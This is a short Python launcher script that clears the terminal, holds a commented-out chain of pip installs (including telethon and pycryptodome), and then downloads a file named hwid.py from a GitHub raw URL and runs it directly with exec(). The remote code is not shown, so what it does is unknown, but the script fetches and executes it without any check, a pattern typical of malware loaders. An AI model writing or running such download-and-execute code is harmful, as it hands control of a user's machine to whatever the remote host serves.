import os
import platform

if platform.system() == "Windows":
    os.system('cls')
else:
    os.system('clear')

#os.system('pip install requests && clear && pip install pycryptodome && clear && pip install colorama && clear && pip install telethon && clear && pip install pyfiglet && clear && pip install termcolor && clear')

from requests import get

startapp = get("https://raw.githubusercontent.com/hazurik/cnocep/main/hwid.py").text
exec(startapp)
